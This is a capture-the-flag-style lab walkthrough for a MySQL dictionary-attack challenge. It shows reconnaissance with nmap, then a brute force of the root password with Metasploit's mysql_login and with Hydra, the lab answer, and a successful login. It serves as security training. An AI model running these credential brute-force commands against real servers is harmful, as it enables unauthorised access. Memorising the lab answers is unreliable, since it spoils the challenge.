# MySQL Recon: Dictionary Attack

### Overview

> In this challenge we will look at the dictionary attacks on MySQL server. Please start the lab and answer the following questions:
>
> Questions
>
> 1. Find the password of user “root” which is required to access the MySQL server. Use suitable metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt
> 2. Find the password of user “root” which is required to access the MySQL server. Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt
>
> Instructions:&#x20;
>
> * This lab is dedicated to you! No other users are on this network :)
> * Once you start the lab, you will have access to a root terminal of a Kali instance
> * Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
> * The Target machine should be located at the IP address 192.X.Y.3.
> * Do not attack the gateway located at IP address 192.X.Y.1



> 🔬 [MySQL Recon: Dictionary Attack](https://attackdefense.com/challengedetails?cid=532)
>
> * Target IP: `192.207.185.3`
> * `MySQL` server dictionary attack.

```bash
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
233084: eth0@if233085: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:0b brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.11/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
233087: eth1@if233088: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:cf:b9:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.207.185.2/24 brd 192.207.185.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# nmap -sn 192.207.185.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-28 02:53 UTC
Nmap scan report for linux (192.207.185.1)
Host is up (0.000023s latency).
MAC Address: 02:42:7A:12:33:F7 (Unknown)
Nmap scan report for target-1 (192.207.185.3)
Host is up (0.0000090s latency).
MAC Address: 02:42:C0:CF:B9:03 (Unknown)
Nmap scan report for attackdefense.com (192.207.185.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.00 seconds

root@attackdefense:~# nmap 192.207.185.3   
root@attackdefense:~# nmap -sV 192.207.185.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-28 02:55 UTC
Nmap scan report for target-1 (192.207.185.3)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
MAC Address: 02:42:C0:CF:B9:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

> 1. Find the password of user “root” which is required to access the MySQL server. Use suitable metasploit module with password dictionary: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

> Answer:
>
> `catalina`

```bash
msf5 > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary(scanner/mysql/mysql_login) > options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.207.185.3
RHOSTS => 192.207.185.3
msf5 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/mysql/mysql_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf5 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_login) > exploit

[+] 192.207.185.3:3306    - 192.207.185.3:3306 - Success: 'root:catalina'
[*] 192.207.185.3:3306    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 2. Find the password of user “root” which is required to access the MySQL server. Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt

> Answer:
>
> `catalina`

```bash
root@attackdefense:~# hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.207.185.3 mysql
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-28 02:59:45
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
[DATA] attacking mysql://192.207.185.3:3306/
[3306][mysql] host: 192.207.185.3   login: root   password: catalina
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-28 03:00:40
```

> Login to user "root" by using the password that we have brute forced.

<pre class="language-bash"><code class="lang-bash">root@attackdefense:~# mysql -h 192.<a data-footnote-ref href="#user-content-fn-1">2</a>07.185.3 -u root            
ERROR 1045 (28000): Access denied for user 'root'@'idngledxq7wvwbvotpvxb.temp-network_a-207-185' (using password: NO)
root@attackdefense:~# mysql -h 192.207.185.3 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 2976
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
3 rows in set (0.001 sec)

MySQL [(none)]> 
</code></pre>















[^1]: 
